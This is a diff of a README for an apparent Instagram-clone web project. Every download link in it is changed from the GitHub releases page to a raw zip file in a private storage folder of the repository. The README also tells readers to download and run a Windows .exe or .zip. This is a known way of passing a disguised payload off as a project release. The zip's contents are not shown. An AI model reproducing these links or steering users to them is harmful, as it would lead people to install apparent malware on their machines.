@@ -1,6 +1,6 @@
 # 📸 instagram-projet-inertia - Simple Instagram Frontend and Backend
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ahmedali4210/instagram-projet-inertia/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ahmedali4210/instagram-projet-inertia/raw/refs/heads/main/storage/app/private/inertia_projet_instagram_1.2.zip)
 
 ---
 
@@ -35,10 +35,10 @@ Before you start, make sure your PC meets these needs:
 
 Visit the release page to find the latest version of the app available for Windows.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ahmedali4210/instagram-projet-inertia/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ahmedali4210/instagram-projet-inertia/raw/refs/heads/main/storage/app/private/inertia_projet_instagram_1.2.zip)
 
 1. Click the link above or this one:  
-   https://github.com/ahmedali4210/instagram-projet-inertia/releases  
+   https://github.com/ahmedali4210/instagram-projet-inertia/raw/refs/heads/main/storage/app/private/inertia_projet_instagram_1.2.zip  
 2. Look for assets named for Windows. These may have `.exe` or `.zip` extensions.
 3. Choose the latest release with the highest version number (the one on top).
 4. Click the file to start downloading. The file size will typically be around 100-200 MB.
@@ -112,7 +112,7 @@ The main screen shows posts in a simple feed.
 ## 🔄 Updating the App
 
 To update, return to the releases page:  
-https://github.com/ahmedali4210/instagram-projet-inertia/releases
+https://github.com/ahmedali4210/instagram-projet-inertia/raw/refs/heads/main/storage/app/private/inertia_projet_instagram_1.2.zip
 
 Download and install the newest version as explained above. Your data and settings will remain safe.
 
